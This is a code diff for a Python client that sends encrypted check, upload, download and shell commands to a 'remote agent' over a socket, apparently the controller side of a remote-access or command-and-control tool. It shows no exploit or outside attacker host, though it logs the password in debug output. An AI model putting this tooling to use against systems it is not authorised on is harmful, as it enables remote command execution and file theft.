@@ -9,11 +9,13 @@ def Check(channel, password):
 
     try:
 
+        BUFFER_SIZE = 1024
+
         # Get main logger, define in core.logger
         logger = logging.getLogger('main')
 
         # Define a buffer size
-        bufferSize = 4096
+        bufferSize = BUFFER_SIZE
         # Encrypt 'alive ?' message with symmetric key
         checkMessage = crypto.encrypt_message(password, 'alive ?').encode()
         # Send encrypted message
@@ -44,11 +46,98 @@ def Check(channel, password):
         logger.warning(f"Channel reset by peer (broken pipe error)")
         return True
 
-
-def Upload(channel, password, source, destination):
-    """Upload a file to remote agent, destination must be a directory"""
+def Download(channel, password, source, destination):
+    """Download a file on remote host to a local directory"""
 
     try:
+
+
+        BUFFER_SIZE = 1024
+
+        # Get the main logger, defined in logger module
+        logger = logging.getLogger('main')
+
+        # Get ~ directory
+        homeFolder = os.environ['HOME']
+        # Define Py314 hidden directory
+        py314Folder = f"{homeFolder}/.Py314"
+        # Define a temporary file
+        tempFile = f"{py314Folder}/temp.crypt"
+        # Define remote file basename and final decrypted file fullpath
+        sourceBasename = os.path.basename(source)
+        finalFile = f"{destination}/{sourceBasename}"
+
+        # Some debug
+        logger.debug(f"Channel given : {channel}")
+        logger.debug(f"Password given : {password}")
+        logger.debug(f"Source file given : {source}")
+        logger.debug(f"Source file basename : {sourceBasename}")
+        logger.debug(f"Destination folder given : {destination}")
+        logger.debug(f"Temporary encrypted file : {tempFile}")
+        logger.debug(f"Final local file fullpath : {finalFile}")
+
+        # Craft a first message, with source file and destination directory
+        message = f"download {source}"
+        # Encrypt message with symmetric key
+        encryptedMessage = crypto.encrypt_message(password, message)
+        # Then, send this first message
+        channel.sendall(encryptedMessage.encode())
+
+        bufferSize = BUFFER_SIZE
+
+        # While True, receive data
+        while True:
+            logger.debug('Waiting for agent answer about download...')
+            agentAnswer = channel.recv(bufferSize)
+            if len(agentAnswer) < bufferSize:
+                logger.debug('break recv while loop')
+                break
+        # Decrypt agent answer
+        decryptedAnswer = crypto.decrypt_message(password, agentAnswer.decode())
+        logger.debug(f"Agent answer : {decryptedAnswer}")
+
+        if decryptedAnswer == '!':
+            logger.warning(f"Remote file {source} doesn't exist")
+
+        elif decryptedAnswer == 'ready':
+
+            with open(tempFile, 'ab') as fileStream:
+
+                bufferSize = BUFFER_SIZE
+                rawFile = b''
+            
+                # While loop to complete socket buffer in recv 
+                while True:
+                    rawFile = channel.recv(bufferSize)
+                    fileStream.write(rawFile)
+                    logger.debug(f"Write partial file : {rawFile}")
+                    if len(rawFile) < bufferSize:
+                        logger.debug('break recv while loop')
+                        break
+            logger.debug(f"Temporary file successfully written")
+
+            crypto.decrypt_file(password, tempFile, finalFile)
+            os.remove(tempFile)
+            logger.debug(f"Temporary file {tempFile} deleted")
+            logger.info(f"File successfully downloaded to {finalFile}")
+
+
+
+
+
+    except Exception as error:
+        logger.warning('An error occured during downloading file : ')
+        logger.warning(error)
+
+
+
+
+def Upload(channel, password, source, destination):
+    """Upload a file from a local directory to remote agent"""
+
+    try:
+
+        BUFFER_SIZE = 1024
 
         # Get the main logger, defined in logger module
         logger = logging.getLogger('main')
@@ -71,14 +160,14 @@ def Upload(channel, password, source, destination):
 
         
         # Craft a first message, with source file and destination directory
-        message = f"send {source} {destination}"
+        message = f"upload {source} {destination}"
         # Encrypt message with symmetric key
         encryptedMessage = crypto.encrypt_message(password, message)
         # Then, send this first message
         channel.sendall(encryptedMessage.encode())
     
         # Define a empty agentAnswer and a buffer size
-        agentAnswer, bufferSize = b'', 4096
+        agentAnswer, bufferSize = b'', BUFFER_SIZE
 
         # While True, receive data
         while True:
@@ -120,13 +209,15 @@ def Shell(channel, password, command):
     """Try to interact with remote agent with a shell"""
 # Module to send a shell command to remote agent
 
+    BUFFER_SIZE = 1024
+
     logger = logging.getLogger('main')
 
     logger.debug(f"Channel given : {channel}")
     logger.debug(f"Password given : {password}")
 
     # Define a buffer size, 1024 bytes
-    bufferSize = 4096
+    bufferSize = BUFFER_SIZE
 
     if command == b'':
         pass
